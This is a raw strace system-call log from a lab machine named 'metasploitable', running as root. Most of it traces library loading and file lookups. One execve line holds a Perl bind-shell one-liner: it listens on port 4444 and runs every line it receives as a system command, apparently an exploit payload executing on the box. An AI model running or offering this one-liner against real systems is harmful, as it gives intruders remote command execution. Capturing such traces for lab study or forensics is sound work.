11345 07:37:14.519300 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11345 07:37:14.519437 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11345 07:37:14.519455 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e0e000
11345 07:37:14.519467 mmap2(0xb7e17000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e17000
11345 07:37:14.519483 close(1)          = 0
11345 07:37:14.519504 munmap(0xb7fc9000, 29913) = 0
11345 07:37:14.519520 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
11345 07:37:14.519534 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11345 07:37:14.519545 _llseek(1, 0, [0], SEEK_CUR) = 0
11345 07:37:14.519557 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
11345 07:37:14.519574 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fd0000
11345 07:37:14.519584 _llseek(1, 1624, [1624], SEEK_SET) = 0
11345 07:37:14.519599 munmap(0xb7fd0000, 1624) = 0
11345 07:37:14.519609 close(1)          = 0
11345 07:37:14.519637 getpgrp()         = 3831
11345 07:37:14.519647 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
11345 07:37:14.519662 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
11345 07:37:14.519678 brk(0x8101000)    = 0x8101000
11345 07:37:14.519709 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.519724 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.519738 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.519775 brk(0x8102000)    = 0x8102000
11345 07:37:14.519804 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11345 07:37:14.519807 stat64("/sbin/AB", 0xbf9f5848) = -1 ENOENT (No such file or directory)
11345 07:37:14.519807 stat64("/bin/AB", 0xbf9f5848) = -1 ENOENT (No such file or directory)
11345 07:37:14.519807 stat64("/usr/sbin/AB", 0xbf9f5848) = -1 ENOENT (No such file or directory)
11345 07:37:14.519808 stat64("/usr/bin/AB", 0xbf9f5848) = -1 ENOENT (No such file or directory)
11345 07:37:14.519808 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11345 07:37:14.519808 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e446f8) = 11346
11346 07:37:14.519808 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11346 07:37:14.519813 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11346 07:37:14.519826 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11346 07:37:14.519838 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11346 07:37:14.519853 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11346 07:37:14.519869 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11346 07:37:14.519882 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11346 07:37:14.519938 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
11346 07:37:14.519952 --- SIGPIPE (Broken pipe) @ 0 (0) ---
11346 07:37:14.520050 exit_group(127)   = ?
11345 07:37:14.559723 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11345 07:37:14.559723 --- SIGCHLD (Child exited) @ 0 (0) ---
11345 07:37:14.559723 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 11346
11345 07:37:14.559723 waitpid(-1, 0xbf9f54c8, WNOHANG) = -1 ECHILD (No child processes)
11345 07:37:14.559724 sigreturn()       = ? (mask now [])
11345 07:37:14.559724 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11345 07:37:14.559724 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:37:14.559733 waitpid(11345,  <unfinished ...>
11345 07:37:14.559743 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11345 07:37:14.559756 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
11345 07:37:14.559775 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11345 07:37:14.559786 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11345 07:37:14.559821 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11345 07:37:14.559841 stat64("/sbin/perl", 0xbf9f5878) = -1 ENOENT (No such file or directory)
11345 07:37:14.559854 stat64("/bin/perl", 0xbf9f5878) = -1 ENOENT (No such file or directory)
11345 07:37:14.559865 stat64("/usr/sbin/perl", 0xbf9f5878) = -1 ENOENT (No such file or directory)
11345 07:37:14.559877 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11345 07:37:14.559895 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11345 07:37:14.559921 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11345 07:37:14.559935 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e446f8) = 11347
11347 07:37:14.559983 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11347 07:37:14.560000 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11347 07:37:14.560013 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11347 07:37:14.560025 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11347 07:37:14.560050 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11347 07:37:14.560066 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11347 07:37:14.560079 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11347 07:37:14.560115 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
11347 07:37:14.560204 brk(0)            = 0x8153000
11347 07:37:14.560225 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.560241 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fcc000
11347 07:37:14.560256 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.560274 open("/etc/ld.so.cache", O_RDONLY) = 1
11347 07:37:14.569811 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11347 07:37:14.569812 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc4000
11347 07:37:14.569812 close(1)          = 0
11347 07:37:14.569812 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.569812 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11347 07:37:14.569812 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11347 07:37:14.569813 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11347 07:37:14.569813 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fc0000
11347 07:37:14.569824 mmap2(0xb7fc2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fc2000
11347 07:37:14.569841 close(1)          = 0
11347 07:37:14.569853 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.569867 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
11347 07:37:14.569881 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
11347 07:37:14.569970 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
11347 07:37:14.569987 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f9b000
11347 07:37:14.569999 mmap2(0xb7fbe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fbe000
11347 07:37:14.570014 close(1)          = 0
11347 07:37:14.570026 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.570052 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
11347 07:37:14.570067 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
11347 07:37:14.570158 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
11347 07:37:14.570174 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9a000
11347 07:37:14.570187 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f82000
11347 07:37:14.570199 mmap2(0xb7f96000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f96000
11347 07:37:14.570213 mmap2(0xb7f98000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f98000
11347 07:37:14.570227 close(1)          = 0
11347 07:37:14.570239 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.570252 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11347 07:37:14.570266 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11347 07:37:14.570355 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11347 07:37:14.570372 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e33000
11347 07:37:14.570383 mmap2(0xb7f7c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f7c000
11347 07:37:14.570398 mmap2(0xb7f7f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f7f000
11347 07:37:14.570411 close(1)          = 0
11347 07:37:14.570423 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11347 07:37:14.570436 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
11347 07:37:14.570450 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
11347 07:37:14.570550 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
11347 07:37:14.570568 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e01000
11347 07:37:14.570580 mmap2(0xb7e0a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e0a000
11347 07:37:14.570594 mmap2(0xb7e0c000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e0c000
11347 07:37:14.570608 close(1)          = 0
11347 07:37:14.570631 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e00000
11347 07:37:14.570644 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e008c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11347 07:37:14.570710 mprotect(0xb7f7c000, 4096, PROT_READ) = 0
11347 07:37:14.570736 munmap(0xb7fc4000, 29913) = 0
11347 07:37:14.570749 set_tid_address(0xb7e00908) = 11347
11347 07:37:14.570759 set_robust_list(0xb7e00910, 0xc) = 0
11347 07:37:14.570768 futex(0xbfb62800, 0x81 /* FUTEX_??? */, 1) = 0
11347 07:37:14.570782 rt_sigaction(SIGRTMIN, {0xb7f862c0, [], SA_SIGINFO}, NULL, 8) = 0
11347 07:37:14.570795 rt_sigaction(SIGRT_1, {0xb7f86340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
11347 07:37:14.570808 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
11347 07:37:14.570822 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
11347 07:37:14.570841 uname({sys="Linux", node="metasploitable", ...}) = 0
11347 07:37:14.570888 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
11347 07:37:14.570934 brk(0)            = 0x8153000
11347 07:37:14.570944 brk(0x8174000)    = 0x8174000
11347 07:37:14.570988 getuid32()        = 0
11347 07:37:14.570998 geteuid32()       = 0
11347 07:37:14.571007 getgid32()        = 0
11347 07:37:14.571016 getegid32()       = 0
11347 07:37:14.571024 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ddf000
11347 07:37:14.571024 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
11347 07:37:14.571024 read(1, "\214\355\21\247", 4) = 4
11347 07:37:14.571024 close(1)          = 0
11347 07:37:14.571025 time(NULL)        = 1495625834
11347 07:37:14.571047 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfb624d0) = -1 ENOENT (No such file or directory)
11347 07:37:14.571065 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfb624d0) = -1 ENOENT (No such file or directory)
11347 07:37:14.571077 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfb624d0) = -1 ENOENT (No such file or directory)
11347 07:37:14.571093 stat64("/usr/local/lib/perl/5.8.7", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571105 stat64("/usr/local/share/perl/5.8.7", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571118 stat64("/usr/local/lib/perl/5.8.6", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571129 stat64("/usr/local/share/perl/5.8.6", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571141 stat64("/usr/local/lib/perl/5.8.4", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571153 stat64("/usr/local/share/perl/5.8.4", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571164 stat64("/usr/local/lib/perl/5.8.3", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571176 stat64("/usr/local/share/perl/5.8.3", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571188 stat64("/usr/local/lib/perl/5.8.2", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571199 stat64("/usr/local/share/perl/5.8.2", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571211 stat64("/usr/local/lib/perl/5.8.1", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571223 stat64("/usr/local/share/perl/5.8.1", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571242 stat64("/usr/local/lib/perl/5.8.0", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571260 stat64("/usr/local/share/perl/5.8.0", 0xbfb62610) = -1 ENOENT (No such file or directory)
11347 07:37:14.571283 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62308) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.571297 _llseek(0, 0, [0], SEEK_CUR) = 0
11347 07:37:14.571309 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62308) = -1 EBADF (Bad file descriptor)
11347 07:37:14.571320 _llseek(1, 0, 0xbfb62350, SEEK_CUR) = -1 EBADF (Bad file descriptor)
11347 07:37:14.571330 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb62308) = -1 EINVAL (Invalid argument)
11347 07:37:14.571342 _llseek(2, 0, 0xbfb62350, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11347 07:37:14.571352 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
11347 07:37:14.571365 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb623c8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.571375 _llseek(1, 0, [0], SEEK_CUR) = 0
11347 07:37:14.571386 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
11347 07:37:14.571398 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
11347 07:37:14.571417 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
11347 07:37:14.571469 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
11347 07:37:14.571512 getppid()         = 11345
11347 07:37:14.571573 stat64("/etc/perl/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571587 stat64("/etc/perl/IO.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571601 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571613 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
